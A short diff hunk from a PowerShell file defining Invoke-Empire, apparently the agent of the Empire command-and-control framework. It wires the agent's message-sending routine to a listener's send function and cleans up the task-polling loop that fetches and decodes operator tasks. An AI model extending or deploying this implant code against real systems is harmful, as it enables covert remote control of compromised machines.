@@ -777,19 +777,19 @@ function Invoke-Empire {
 	}
 	# send message function iterating through listeners
 	$script:SendMessage = {
-		param($Listener, $PacketData)
-		[string]::Format("called send message with data = {0}",$PacketData) >> ".\agent_debug.log"
+		param($Listener, $Packets)
+        (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
 	}
 
 	$script:GetTask = {
 		param($Listener)
 
-		$TaskData = (& $l['get_task_func'])
+		$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
 		if (!$TaskData){
-			$l['missedCheckins'] += 1
+			$Listener['missedCheckins'] += 1
 		}
 		else {
-			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $l['defaultResponse']) {
+			if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
 				Decode-RoutingPacket -PacketData $TaskData
 			}
 		}
